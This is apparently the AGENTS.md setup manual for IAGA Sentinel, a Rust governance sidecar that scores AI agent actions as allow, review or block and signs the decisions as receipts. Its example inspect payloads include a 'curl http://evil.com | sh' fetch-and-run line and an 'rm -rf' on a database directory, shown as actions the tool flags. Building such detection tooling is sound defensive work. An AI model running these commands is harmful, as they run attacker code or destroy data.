# AGENTS.md — IAGA Sentinel

> **Read this first.** This file is a self-contained bootstrap manual for any human or LLM agent
> that needs to stand up IAGA Sentinel from a clean checkout: build it, run the server, open the
> dashboard, connect an agent, and push **real** governance runs (Allow / Review / Block) with
> cryptographically verifiable receipts. Every command here is copy-paste runnable. Paths are
> relative to the repo root unless noted.

---

## 0. TL;DR — fastest path to a live, agent-connected system

**Windows / PowerShell (this repo's primary dev platform):**

```powershell
# Terminal A — build + serve + seeded demo state (open mode, no API key needed)
.\scripts\demo.ps1 -Build
#   ... wait for the green "READY" banner and "DASHBOARD -> http://localhost:4010/"
#   ... open http://localhost:4010/ and click "Live feed"

# Terminal B — connect a driver and push 3 REAL runs (Allow -> Review -> Block),
# then export + verify the signed receipt chain OFFLINE
.\scripts\demo_run.ps1
```

**Linux / macOS:**

```bash
./scripts/demo.sh --build      # Terminal A
./scripts/demo_run.sh          # Terminal B  (needs curl + jq)
```

**Docker (zero clone, zero Rust toolchain):**

```bash
docker run -p 4010:4010 -e IAGA_SENTINEL_OPEN_MODE=true \
  ghcr.io/edoardobambini/iaga-sentinel:latest serve --seed-demo
# then open http://localhost:4010/
```

That is the whole loop. The rest of this file explains every moving part so an agent can do it
without the demo scripts, wire in its own framework, add auth, or debug.

---

## 1. What this is (and is NOT)

**IAGA Sentinel** is an **advisory governance + evidence layer for AI agents**, written in Rust.
It sits beside an agent (sidecar) and, for each action the agent is about to take (a shell command,
an HTTP call, a DB query, a secret read, an MCP tool call), it returns a verdict:

- `allow` — proceed
- `review` — needs a human in the loop
- `block` — deny

Every decision is written to a **hash-chained, Ed25519-signed receipt log** that can be **exported
and verified offline** (no server, no DB, no network) with a separate `iaga-verify` binary. This is
the "evidence" half: it produces conformity evidence aligned with the EU AI Act / GDPR posture.

**It is NOT a gateway / proxy that sits in the network data path and hard-blocks traffic.** It is an
**advisory** layer: it emits verdicts and evidence; enforcement is cooperative (the agent/framework
adapter honors the verdict). Every OSS receipt is stamped `is_authoritative: false` on purpose. Do
not describe it as a "gateway."

- **License:** BUSL-1.1 (Change License Apache-2.0, auto-converts 4 years after each release).
- **This repo = the OSS ("community") build.** "Enterprise" is a *conceptual* product boundary
  (see `ENTERPRISE.md`, `docs/adr/0010-oss-enterprise-boundary.md`), **not** a directory. There is
  **no** `community/`, `enterprise/`, or `cheshire-cat/` directory in this repo.

---

## 2. Repository layout

```
agent-armor/                      # repo root (project name: IAGA Sentinel)
├── Cargo.toml                    # workspace root (9 crates), version 1.9.0, MSRV 1.88, BUSL-1.1
├── Cargo.lock
├── Dockerfile                    # 2-stage build -> ghcr.io/edoardobambini/iaga-sentinel
├── docker-compose.yml            # server + 2 named volumes (data + signer keys)
├── iaga-sentinel.config.json     # sample policy config (JSON form of the YAML)
├── crates/                       # the Rust workspace (see §3)
├── sdks/                         # python/  typescript/  conformance/  (see §7)
├── plug-ins/                     # framework integrations + copy-paste adapters (see §7)
├── examples/                     # e2e/*.dictum, integrations/, threat-intel.toml
├── docs/                         # ARCHITECTURE.md, openapi.yaml, adr/, demo/README.md, ...
├── scripts/                      # demo.ps1 / demo.sh / demo_run.ps1 / demo_run.sh  (see §9)
├── deploy/kubernetes/            # deployment.yaml, kustomization.yaml
├── charts/iaga-sentinel/         # Helm chart
├── target/                       # build output (release binaries land here)
└── io/                           # UNRELATED untracked Obsidian vault — ignore it
```

Binaries produced by the workspace:
- **`iaga`** (alias **`iaga-sentinel`**) — the server + full CLI. Entry: `crates/iaga-sentinel-core/src/main.rs`.
- **`iaga-verify`** — standalone offline receipt-chain verifier. Crate: `crates/iaga-sentinel-verify`.

On Windows they are `target\release\iaga.exe` and `target\release\iaga-verify.exe`.

---

## 3. The Cargo workspace (9 crates)

| Crate | One-line purpose |
|---|---|
| `iaga-sentinel-core` | Server, HTTP API, governance pipeline, embedded dashboard, CLI. Lib name `iaga_sentinel`; produces `iaga` + `iaga-sentinel` binaries. |
| `iaga-sentinel-receipts` | Ed25519-signed receipts + hash-chained append-log + deterministic replay (`Signer` trait). |
| `iaga-sentinel-cost` | Canonical cost/usage types + self-hosted token→USD pricing engine. |
| `iaga-sentinel-dictum` | **Dictum** policy language: parser, Hindley-Milner type checker, deterministic evaluator, optional WASM codegen. |
| `iaga-sentinel-reasoning` | Probabilistic "Reasoning Plane" (ML evidence; pure-Rust `tract-onnx`; opt-in `ml` feature). |
| `iaga-sentinel-kernel` | Enforcement kernel: cross-platform userspace launcher + eBPF/LSM scaffold (Linux). |
| `iaga-sentinel-verify` | Standalone offline receipt-chain verifier. Produces `iaga-verify`. |
| `iaga-sentinel-integrations` | Shared adapter contract + async HTTP client for the governance API. |
| `iaga-sentinel-mcp` | `iaga::mcp::GovernedTool` — cooperative MCP `tools/call` governance client. |

**Feature flags** (`crates/iaga-sentinel-core/Cargo.toml`):
- **default** = `["demo", "sqlite", "receipts", "dictum", "reasoning", "kernel", "cost-control"]`
- opt-in = `postgres`, `plugins`, `dictum-wasm`, `ml`, `linux-bpf`, `plugin-attestation`,
  `otel-receipts`, `plugin-manifest-signing`

---

## 4. Prerequisites

- **Rust** stable toolchain, **MSRV 1.88+** (`rustup update`). CI/Docker build on 1.94.
- **Git** (to clone; already present if you're reading this in-repo).
- Optional: **Docker** (for the container path), **jq + curl** (for the `.sh` demo driver).
- Windows: **Windows Terminal / PowerShell 5.1+** for the ANSI demo banners.

Nothing else. The dashboard is **embedded in the binary** — there is **no npm / Node build step**.

---

## 5. Build

```bash
# release build of the two binaries you need to run + verify
cargo build --release -p iaga-sentinel-core -p iaga-sentinel-verify
```

Notes:
- On disk-constrained dev boxes, set `CARGO_INCREMENTAL=0` (the demo script and CI do this).
- The heavy `--all-features` build additionally wants `RUSTFLAGS="-C debuginfo=0"` (disk pressure);
  a plain default build does not need it.
- Binaries land in `target/release/` (`iaga[.exe]`, `iaga-verify[.exe]`).

Install from git instead of building locally:

```bash
cargo install --git https://github.com/EdoardoBambini/IAGA-Sentinel --tag v1.9.0 --locked \
  iaga-sentinel-core iaga-sentinel-verify
```

---

## 6. Run the server

The server subcommand is `serve` (it is also the **default** when no subcommand is given).

```bash
# simplest local bring-up: no auth required, seeded demo profiles/workspaces
IAGA_SENTINEL_OPEN_MODE=true iaga serve --seed-demo
```

PowerShell equivalent:

```powershell
$env:IAGA_SENTINEL_OPEN_MODE = 'true'
.\target\release\iaga.exe serve --seed-demo
```

- **Binds `0.0.0.0:4010` by default.** Override with `PORT` / `IAGA_SENTINEL_HOST` or `--port`.
- Dashboard: **http://localhost:4010/**
- Health check: `GET http://localhost:4010/health` → `{ "ok": true, "openMode": true, ... }`
- `--seed-demo` seeds demo profiles + workspaces + the 3 demo scenarios on first boot.
- `--policy <file.dictum>` loads a Dictum overlay (see §11). Loaded once at boot (no hot reload).

### Config file

On `serve`, the server searches the **current working directory** (in order) for:
`iaga-sentinel.yaml`, `iaga-sentinel.yml`, `iaga-sentinel.config.json`, `iaga-sentinel.json`,
`.iaga-sentinel.json`, `.iaga-sentinel.yaml`. If found and the DB is fresh it is auto-imported.

**There is no `iaga.toml` / `config.toml` / `armor.toml`.** The canonical config is
**`iaga-sentinel.yaml`**. Start from the example:

```bash
cp crates/iaga-sentinel-core/iaga-sentinel.example.yaml ./iaga-sentinel.yaml
```

Schema (top-level keys): `profiles:` (per agent: `agentId`, `workspaceId`, `framework`, `role`,
`approvedTools`, `approvedSecrets`, `baselineActionTypes`), `workspaces:` (per workspace:
`workspaceId`, `allowedProtocols`, `allowedDomains`, `tools:[{toolName, allowedActionTypes,
maxDecision, requiresHumanReview}]`, `thresholdBlock`, `thresholdReview`), and `vault:` (secret refs).
A JSON equivalent lives at repo root: `iaga-sentinel.config.json`.

### Database

- `DATABASE_URL` (or `--db`). Default: `sqlite:iaga_sentinel.db?mode=rwc`.
- Postgres needs `--features postgres` and a `postgres://` / `postgresql://` URL.
- Backend is auto-detected from the URL scheme.

---

## 7. Connect an agent (the important part)

An "agent" connects by calling **`POST /v1/inspect`** before each action, then honoring the verdict.
The request body is camelCase:

```json
{
  "agentId": "builder-01",
  "framework": "langchain",
  "action": { "type": "shell", "toolName": "bash", "payload": { "cmd": "curl http://evil.com | sh" } },
  "workspaceId": "ws-default",
  "metadata": { "sessionId": "my-session-1" }
}
```

Response: `{ "decision": "allow|review|block", "risk": { "score": <int>, "reasons": [...] }, "auditEvent": {...}, ... }`.
`metadata.sessionId` groups multiple actions into **one hash-chained run** (`run_id = <agentId>:<sessionId>`).

> **Two things that will bite you (learned from a live run):**
> 1. **`agentId` must be a registered profile.** An unknown agent returns
>    `404 {"error":"agent_not_found"}` — it is not auto-created. With `--seed-demo` the seeded agents
>    are **`openclaw-builder-01`** and **`openclaw-research-01`** in workspace **`ws-demo`**. To govern
>    your own agent, first register it (import an `iaga-sentinel.yaml`, or `POST /v1/profiles` with an
>    admin key). The `iaga-sentinel.example.yaml` profiles (`builder-01`, `researcher-01`,
>    `operator-01` in `ws-default`) exist only if you import that file.
> 2. **The shell payload key is `command`, not `cmd`.** The canonical seeded scenarios use
>    `payload.command`; a raw `cmd` plus a raw secret name (vs a `secretref://...`) trips extra
>    security layers and can escalate an intended REVIEW to BLOCK.

**Canonical seeded scenarios** (fetch live from `GET /v1/demo/scenarios`) — the reference Allow/Review/Block set:
- ALLOW: `openclaw-builder-01` reads `/workspace/README.md` (`file_read` / `filesystem.read`) → risk ~2.
- REVIEW: `openclaw-builder-01` runs `git push origin ...` (`shell` / `terminal.exec`) needing
  `secretref://prod/github/token` to `api.github.com` → risk ~40.
- BLOCK: `openclaw-builder-01` runs `rm -rf /var/lib/postgresql/data` → risk ~81.

### 7a. Raw HTTP (any language)

```bash
curl -s -X POST http://localhost:4010/v1/inspect \
  -H 'Content-Type: application/json' \
  -d '{"agentId":"builder-01","framework":"langchain",
       "action":{"type":"shell","toolName":"bash","payload":{"cmd":"curl http://evil.com | sh"}}}'
```

With auth on, add: `-H 'Authorization: Bearer iaga_xx...'`.

### 7b. Python SDK

Package `sdks/python/` (distribution name `iaga-sentinel`, import `iaga_sentinel`, dep `httpx`).

```python
from iaga_sentinel import SentinelClient
c = SentinelClient(base_url="http://localhost:4010", api_key=None)  # api_key optional in open mode
r = c.inspect({
    "agentId": "openclaw-builder-01", "workspaceId": "ws-demo",   # a REGISTERED agent (seeded by --seed-demo)
    "framework": "openclaw", "protocol": "mcp",
    "action": {"type": "shell", "toolName": "terminal.exec",
               "payload": {"command": "rm -rf /var/lib/postgresql/data", "intent": "cleanup"}},
    "metadata": {"sessionId": "my-session-1"},
})
print(r.decision, r.risk.score)   # -> GovernanceDecision.BLOCK 81
```

Install/run the SDK from the repo without publishing: `PYTHONPATH=sdks/python python your_agent.py`
(needs `httpx`). Result fields are objects: `r.decision`, `r.risk.score`, `r.risk.reasons`.

Auth header is `Authorization: Bearer <api_key>`. Async: `AsyncSentinelClient`.

### 7c. Framework adapters (wrap an existing agent)

- **Python adapters:** `sdks/python/iaga_sentinel/adapters/` — `openai.py`, `openai_agents.py`,
  `langchain.py`, `langgraph.py`, `crewai.py`, `autogen.py`, `llamaindex.py`, `mcp.py`,
  `microsoft_agent_framework.py`, `pydantic_ai.py`.
  Example (OpenAI): `sentinel_wrap_openai(client, agent_id="builder-01",
  base_url="http://localhost:4010", api_key=None, fail_closed=False)` — wraps
  `chat.completions.create` / `responses.create` and runs a governance preflight.
- **Copy-paste adapters for 15+ frameworks:** `plug-ins/*-adapter/` (openai, langchain, langgraph,
  crewai, autogen, llamaindex, mcp, claude-code, claude-agent-sdk, vercel-ai, pydantic-ai, ...).
- **Released plugins:** `plug-ins/voltagent-plugin/`, `plug-ins/letta-plugin/`, `plug-ins/codex-plugin/`.
- **TypeScript SDK:** `sdks/typescript/`.
- **MCP:** run IAGA between an MCP client and a downstream MCP server (see §10 `proxy` / `mcp-server`).

Client-side env the adapters read: `IAGA_BASE_URL`, `IAGA_AGENT_ID`, `IAGA_SENTINEL_API_KEY`
(the bearer token).

---

## 8. Authentication & API keys

- Bearer token in `Authorization: Bearer <key>`. Keys are hashed with Argon2id. Raw key format:
  `iaga_<uuid-no-dashes>`.
- Two scopes: **`admin`** (everything) and **`agent`** (governance surface: `/v1/inspect`, cost, etc.).
  Admin-only routes return `403 admin_scope_required` for `agent` keys.
- **Open mode:** `IAGA_SENTINEL_OPEN_MODE=true` — while **no keys exist**, requests pass as implicit
  admin. This is the demo/local default. With open mode **off** and no keys, every route is `401`.

### Bootstrapping the first admin key (three ways)

1. **CLI (prints once, unrecoverable):**
   ```bash
   iaga gen-key --label "my-admin" --scope admin
   # -> prints ID, Key (iaga_...), Label, Scope. Save the Key now.
   ```
2. **Env var at startup:** set `IAGA_SENTINEL_BOOTSTRAP_API_KEY=<>=16 printable ASCII chars>` before
   `serve`; it is registered as an **admin** key on boot (idempotent). Invalid value → server exits(2).
3. **HTTP (needs an existing admin):** `POST /v1/auth/keys` with `{ "label": "...", "scope": "admin|agent" }`.

---

## 9. The end-to-end demo (real runs + offline proof)

The scripts under `scripts/` are the canonical "prove it works live" path. They build if needed,
reset to a clean seeded DB, serve, drive **three real verdicts through the live pipeline**, then
export and **verify the signed chain offline**.

**Terminal A — server:**
```powershell
.\scripts\demo.ps1 -Build        # Windows;  ./scripts/demo.sh --build  on Linux/macOS
```
Sets `IAGA_SENTINEL_OPEN_MODE=true`, `CARGO_INCREMENTAL=0`, `PORT=4010`; wipes `iaga_sentinel.db`
(+ `-wal`/`-shm`) for an identical seed each run; runs `iaga serve --seed-demo`; prints the
dashboard URL once `/health` is green.

**Terminal B — driver:**
```powershell
.\scripts\demo_run.ps1           # Windows;  ./scripts/demo_run.sh  on Linux/macOS
```
It resets adaptive risk weights (determinism guard), fetches `GET /v1/demo/scenarios`, injects a
shared `sessionId`, POSTs 3 beats to `/v1/inspect` and **asserts each verdict**:

| Beat | Scenario | Expected | ~risk |
|---|---|---|---|
| 1 | safe repository read | **ALLOW** | ~2 |
| 2 | shell needing a production secret | **REVIEW** | ~40 |
| 3 | `rm -rf` on the DB | **BLOCK** | ~81 |

Then the "money shot": `iaga replay demo-session-iaga --export chain.json` →
`iaga-verify chain.json` (embedded key) and `iaga-verify chain.json --key <pubHex>` (pinned key) →
prints **`CHAIN OK`**. Verified with no server, no DB, no network — just the file + a public key.

> The Ed25519 signer key lives at `~/.iaga-sentinel/keys/receipt_signer.ed25519`
> (`%USERPROFILE%\.iaga-sentinel\keys\...` on Windows), created on first run. **Keep it** — deleting
> it breaks verification of all prior receipts. Override with `IAGA_SENTINEL_SIGNER_KEY_PATH`.

---

## 10. CLI reference (`iaga` / `iaga-sentinel`)

Global: `--db <url>`. Subcommands (some behind feature flags):

| Command | What it does |
|---|---|
| `serve [--port] [--seed-demo] [--policy <file>]` | Start the server (default if omitted). |
| `inspect <file \| --stdin>` | Run one payload through the pipeline. Exit 0/1/2 = allow/review/block. |
| `validate <config>` | Validate a policy YAML/JSON without starting. |
| `import <config>` / `export [--output]` | Policies ↔ DB. |
| `migrate` | Run DB migrations. |
| `gen-key [--label] [--scope admin\|agent]` | Mint an API key (prints once). |
| `audit [--limit] [--format json\|table]` | Dump the audit log. |
| `cost [summary\|by-model\|by-agent\|by-tool\|budget] [--from --to --limit]` | Cost reporting (`cost-control`). |
| `replay [run_id] [--verify-only] [--list] [--limit] [--re-execute] [--export <file>]` | Receipt replay/export (`receipts`). |
| `proxy --agent-id --command [args...]` | Govern MCP tool calls between a client and a downstream MCP server. |
| `mcp-server [--seed-demo]` | Expose governance tools over stdio (MCP). |
| `mcp-doctor --command [args] [--probe-tool] [--format]` | Health-check an MCP endpoint. |
| `policy {test\|lint\|check\|compile}` | Dictum tooling (`dictum` feature; `compile` needs `dictum-wasm`). |
| `plugins {list\|validate\|verify\|sign-manifest\|verify-manifest\|attest}` | Plugin tooling. |
| `reasoning info` | Reasoning plane status (`reasoning`). |
| `run --agent-id [--cwd] -- <cmd...>` | Launch a child under the userspace enforcement kernel (`kernel`). |
| `kernel status` | Kernel status. |

Separate binary: `iaga-verify <chain.json> [--key <hex-ed25519-pubkey>]`
(exit 0 valid / 1 broken/empty / 2 usage / 3 IO-parse).

---

## 11. Dictum policy language

- Extension **`.dictum`**. Syntax:
  `policy "name" { when <expr> [and <expr>] then block|review, reason="..." }`.
- Builtins: `secret_ref()`, `url_host()`, `timestamp()`, `sha256()`. Context exposes `action.kind`,
  `action.tool_name`, `risk.score`, `workspace.allowlist`.
- Example policies: `crates/iaga-sentinel-core/examples/policies/strict.dictum`,
  `crates/iaga-sentinel-dictum/examples/no_pii_egress.dictum` (+ `sample_context.json`),
  `examples/e2e/secrets_and_egress.dictum`.
- Loaded via `iaga serve --policy <file>` as an **overlay** on the YAML baseline: **"stricter wins"**,
  it can only tighten. Its SHA-256 is embedded in every receipt's `policy_hash`. Load error → exit 2.
  No hot reload. Overlay status: `GET /v1/policy/overlay`.
- Test/validate offline:
  ```bash
  iaga policy lint  crates/iaga-sentinel-dictum/examples/no_pii_egress.dictum
  iaga policy check crates/iaga-sentinel-dictum/examples/no_pii_egress.dictum
  iaga policy test  crates/iaga-sentinel-dictum/examples/no_pii_egress.dictum \
       --context crates/iaga-sentinel-dictum/examples/sample_context.json
  ```

---

## 12. HTTP API map

Routes: `crates/iaga-sentinel-core/src/server/create_server.rs`. Full spec: `docs/openapi.yaml`.

- **Public (no auth):** `GET /` (dashboard), `GET /health`, `GET /dashboard/context`.
- **Core:** `POST /v1/inspect` (governance entrypoint; callable by an `agent`-scoped key).
- **Cost:** `GET /v1/cost/{summary,by-agent,by-model,by-tool,over-time,budget,pricing}`.
- **Receipts:** `GET /v1/receipts`, `GET /v1/receipts/{run_id}` (admin).
- **Audit/analytics:** `/v1/audit`, `/v1/audit/export?format=json|csv`, `/v1/audit/stats`,
  `/v1/analytics/agents[/{id}]`.
- **Admin (require admin scope):** profiles/workspaces CRUD, `/v1/auth/keys`, `/v1/webhooks` (+DLQ),
  threat-intel, rate-limit config, risk weights, plugins reload, workspace rules.
- **8-layer surfaces:** `/v1/sessions`, `/v1/nhi/*`, `/v1/risk/*`, `/v1/sandbox/*`,
  `/v1/policy/verify/*`, `/v1/firewall/*`, `/v1/telemetry/*`, `/v1/fingerprint*`, `/v1/threat-intel/*`.
- **Status:** `/v1/policy/overlay`, `/v1/reasoning/status`, `/v1/kernel/status`.
- **Live feed (SSE):** `GET /v1/events/stream` (drives the dashboard).
- **Demo:** `GET /v1/demo/scenarios`, `POST /v1/demo/run-adapter`.

---

## 13. Dashboard / Operator Console

- **Embedded in the binary — no separate build, no npm.** Source:
  `crates/iaga-sentinel-core/src/dashboard/dashboard.html`, rendered by
  `src/dashboard/index_html.rs`, served at `GET /`.
- URL: **http://localhost:4010/**. Tabs: **Live feed** (SSE `/v1/events/stream`),
  **Evidence** (signed receipts), **Audit**.

---

## 14. Receipts & offline verification

- Stored (signed + hash-chained) in the DB (SQLite default `iaga_sentinel.db`, or Postgres).
- Signer key: `IAGA_SENTINEL_SIGNER_KEY_PATH` or default `~/.iaga-sentinel/keys/receipt_signer.ed25519`.
- Verify flow:
  ```bash
  iaga replay --list
  iaga replay <run_id> --export chain.json
  iaga-verify chain.json               # -> CHAIN OK  (trusts embedded key)
  iaga-verify chain.json --key <hex>   # authenticates authorship against a pinned key
  ```
- Also verifiable with the stdlib-only Python verifier `sdks/python/iaga_verify.py` and the TS/Node
  verifier. Cross-language golden vector: `sdks/conformance/golden_chain.json`.
- `IAGA_SENTINEL_RECEIPT_FAIL_CLOSED=1` makes `serve`/`proxy`/`mcp-server`/`run` refuse to start if no
  receipt logger can be built. Every OSS receipt carries `is_authoritative: false`.

---

## 15. Tests

```bash
cargo test --workspace                 # default features
cargo test --workspace --all-features  # heavy; set RUSTFLAGS="-C debuginfo=0" CARGO_INCREMENTAL=0
```

Feature-specific suites mirror CI (`.github/workflows/ci.yml`): `-p iaga-sentinel-reasoning
--features ml`, `-p iaga-sentinel-dictum --features dictum-wasm`, `--features
plugins,plugin-attestation --lib`, `--features otel-receipts --lib`, `--features
plugin-manifest-signing --lib`, `--features cost-control`, `--features postgres` (needs a live PG at
`IAGA_SENTINEL_TEST_PG_URL`). Kernel confinement (`setsid`, `no_new_privs`, `RLIMIT_CORE`) is
`#[cfg(unix)]`-only; on Windows `iaga run` is cooperative/no-op there.

---

## 16. Deploy

- **Docker:** `Dockerfile` (2-stage, `rust:1.94-slim-bookworm` builder → `debian:bookworm-slim`
  runtime, non-root user `iaga`, `EXPOSE 4010`, `ENTRYPOINT ["./iaga"] CMD ["serve"]`).
- **Compose:** `docker-compose.yml` — port `4010:4010`, volumes `iaga-sentinel-data` → `/app/data`
  and `iaga-sentinel-keys` → `/home/iaga/.iaga-sentinel/keys`. Env includes
  `IAGA_SENTINEL_OPEN_MODE`, `IAGA_SENTINEL_BOOTSTRAP_API_KEY`, `IAGA_SENTINEL_NHI_MASTER_SEED`.
- **Kubernetes:** `deploy/kubernetes/` (raw) or the Helm chart `charts/iaga-sentinel/`.
- Published image: `ghcr.io/edoardobambini/iaga-sentinel:latest`.

---

## 17. Environment variables (server)

| Var | Default / meaning |
|---|---|
| `PORT` | `4010` |
| `IAGA_SENTINEL_HOST` | `0.0.0.0` |
| `DATABASE_URL` | `sqlite:iaga_sentinel.db?mode=rwc` |
| `IAGA_SENTINEL_OPEN_MODE` | `false`; `true` = auth-optional while no keys exist |
| `IAGA_SENTINEL_BOOTSTRAP_API_KEY` | registers the first admin key at startup |
| `IAGA_SENTINEL_SIGNER_KEY_PATH` | `~/.iaga-sentinel/keys/receipt_signer.ed25519` |
| `IAGA_SENTINEL_RECEIPT_FAIL_CLOSED` | refuse to start if no receipt logger |
| `IAGA_SENTINEL_DEFAULT_MODE` | `sidecar` / `gateway` |
| `IAGA_SENTINEL_CORS_ORIGINS` | comma-separated; unset = permissive |
| `IAGA_SENTINEL_LOG_FORMAT` / `IAGA_SENTINEL_LOG_LEVEL` / `RUST_LOG` | logging |
| `IAGA_SENTINEL_AUTH_CACHE_TTL_MS` | auth cache (0 disables) |
| `IAGA_SENTINEL_NHI_MASTER_SEED` | NHI identity seed |
| `IAGA_SENTINEL_THREAT_FEED` | path to `threat-intel.toml` |
| `IAGA_SENTINEL_PLUGIN_DIR` / `IAGA_SENTINEL_PLUGIN_PUBKEY` | plugin dir / pubkey |
| `IAGA_SENTINEL_REASONING_MODELS` | ONNX model paths (`ml`) |
| `IAGA_SENTINEL_SESSION_BUDGET_USD` / `IAGA_SENTINEL_PRICING_FILE` | cost control |

Client-side (adapters/plugins, not the server): `IAGA_BASE_URL`, `IAGA_AGENT_ID`,
`IAGA_SENTINEL_API_KEY`.

---

## 18. Gotchas an agent should know

- **Run from the repo root.** `serve` and `replay` resolve the demo DB relative to CWD; the driver
  writes `chain.json` there too. Server and driver must share the same CWD.
- **Windows:** `taskkill /F /IM iaga.exe` (or Ctrl+C the server) before rebuilding — a running binary
  locks `target\release\iaga.exe`.
- **Keep the signer key.** Regenerating `receipt_signer.ed25519` invalidates all prior receipt
  verification.
- **It's advisory, not a gateway.** Verdicts are cooperative; `is_authoritative: false` is intentional.
- **No TOML config.** Config is `iaga-sentinel.yaml` (or the JSON forms), never `iaga.toml`.
- **The dashboard is embedded** — do not look for a `frontend/` npm project.
- **`io/`** at the repo root is an unrelated Obsidian vault; ignore it.
- **`404 agent_not_found` is the #1 first-call error** — register the agent (or use a seeded
  `openclaw-*` one), don't just invent an `agentId`. Use `command` (not `cmd`) in shell payloads.

---

*IAGA Sentinel v1.9.0 · BUSL-1.1 · https://github.com/EdoardoBambini/IAGA-Sentinel*
